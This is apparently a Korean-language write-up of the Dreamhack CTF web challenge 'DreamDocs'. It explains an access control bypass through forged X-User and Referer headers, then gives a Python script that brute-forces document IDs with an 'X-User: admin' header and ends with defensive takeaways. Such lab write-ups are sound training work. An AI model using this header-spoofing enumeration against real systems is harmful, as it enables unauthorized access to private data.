# [Dreamhack] [DreamDocs](https://dreamhack.io/wargame/challenges/2325) Write-up

## 1. Overview
* **Target Challenge:** DreamDocs
* **Category:** Web Hacking
* **Key Concept:** HTTP Header-based Access Control Bypass (Broken Access Control)

---

## 2. Vulnerability Analysis

### Endpoints
* `/share`
* `/doc/<int:doc_id>`
* `/api/docs`

### Source Code Analysis
서비스 동작 및 코드 분석 결과, 다음과 같은 주요 우회 포인트 및 결함이 확인되었습니다.

1. **`X-User` Header Validation Bypass**
   * **원인:** 서버가 사용자 권한을 검증할 때 `request.headers.get('X-User')` 값을 그대로 신뢰합니다.
   * **취약점:** HTTP 요청 헤더는 클라이언트 측에서 자유롭게 조작 가능하므로, `X-User: admin` 헤더를 추가하여 서버를 관리자로 오인하게 만들 수 있습니다.

2. **`Referer` Header Spoofing**
   * **원인:** 이전 요청 출처를 검증하기 위해 `request.headers.get('Referer')` 헤더를 검사합니다.
   * **취약점:** 패킷 조작을 통해 정상적인 접근 경로인 것처럼 `Referer` 값을 쉽게 위조할 수 있습니다.

---

## 3. Proof of Concept (PoC)

`flag_doc_id`는 100~999 사이의 무작위 값으로 설정됩니다. 조작된 `X-User` 및 `Referer` 헤더를 포함하여 문서 ID를 탐색하는 Python 브루트포스(Brute-force) 스크립트를 작성하여 실행합니다.

```python
import requests

TARGET_URL = "[http://host3.dreamhack.games:11262](http://host3.dreamhack.games:11262)"  # 타겟 서버 URL로 변경

headers = {
    'X-User': 'admin',
    'Referer': f'{TARGET_URL}/share'
}

print("Searching for FLAG document...")

for i in range(100, 1000):
    url = f"{TARGET_URL}/doc/{i}"
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        if 'FLAG:' in response.text or 'TOP SECRET' in response.text:
            print(f"\n[+] FLAG Found! Document ID: {i}")
            print(f"[+] Response Content:\n{response.text}")
            break
```

4. Execution & Result
브루트포스 스크립트 실행 결과, Document ID: 106 번 문서에서 FLAG가 노출되는 것을 확인했습니다.

해당 응답 본문을 통해 최종 FLAG를 획득하였습니다.

5. Takeaways
헤더 기반 권한 검증 위험성: 클라이언트가 전송하는 HTTP Header(X-User, Referer 등)는 신뢰할 수 없는 데이터이므로, 이를 이용한 접근 제어 로직은 세션/토큰 등 안전한 인증 메커니즘으로 대체해야 합니다.

Referer 위조: 출처 검증 목적으로 Referer 헤더만 단독 활용하는 것은 쉽게 우회될 수 있음을 확인했습니다.            